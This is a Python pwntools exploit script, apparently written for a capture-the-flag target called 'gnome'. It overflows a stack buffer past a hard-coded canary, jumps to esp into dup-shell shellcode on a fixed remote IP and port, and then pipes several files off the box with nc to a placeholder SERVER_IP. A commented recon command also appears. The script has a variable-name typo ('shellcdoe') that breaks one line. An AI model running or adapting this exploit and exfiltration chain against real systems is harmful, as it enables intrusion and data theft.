from pwn import * 
import os
from ctypes import CDLL
from math import floor
# context.terminal = ['tmux', 'splitw', '-h']
context(arch='x86')

canary = p32(0xe4ffffe4)

# print('0x080493b2 - xor edx, 0xe4ffffe4')
# print('0x08049708  e83f010000     call sym.sgnet_randfd ;[g]')

folder = os.path.join('/', 'gnome', 'www', 'files')
files = [
        '20151215161015.zip',
        'factory_cam_5.zip',
        'gnome.conf'
        ]

server_ip = 'SERVER_IP'

# Exfiltrate files out of the box
command = ''
for index, file in enumerate(files):
    filepath = os.path.join(folder, file)
    curr_command = 'nc {} 5711{} < {};'.format(server_ip, index, filepath)
    command += curr_command

# Before exfiltration, do a little recon on the box
# Trying to see if we can exfiltrate via nc or python
# command = 'whoami;ls;pwd;which nc;which python'
print command

# Continuous loop, trying to wait for the RND to land in our favor
r = remote('54.233.105.81', '4242')

# Secret backdoor to vulnerable function
r.sendline('X')

# Testing padding length
# 100 from buffer length from source file
# canary also found in source
# shellcode = 'A' * 100 + canary + cyclic(400)

# 0x080493b2 - xor edx, 0xe4ffffe4
# 0x0804936b   # 2: jmp esp

# Real jmp esp
jmpesp = p32(0x804936b)

shellcode = 'A' * cyclic_find('bbaa')
shellcode += canary
shellcdoe += 'aaaa'
shellcode += jmpesp
shellcode += asm(shellcraft.dupsh(0xa6)) # 0xa6 is arbitrary. Just some number 0 < x < 1024
shellcode += 'Z' * (200 - len(shellcode))

# Retrieve all the text before we "should" see actual results
r.recvuntil('protected!\n')

log.info("Sending: {}".format(shellcode))
r.sendline(shellcode) 
log.info("Sending: {}".format(command))
r.sendline(command)
gotit = False
total = ''

# Wait for actual results to come back
# Halt the script
for _ in xrange(4):
    out = r.recv()
    if out != '\x00':
        print out
        gotit = True
        total += out
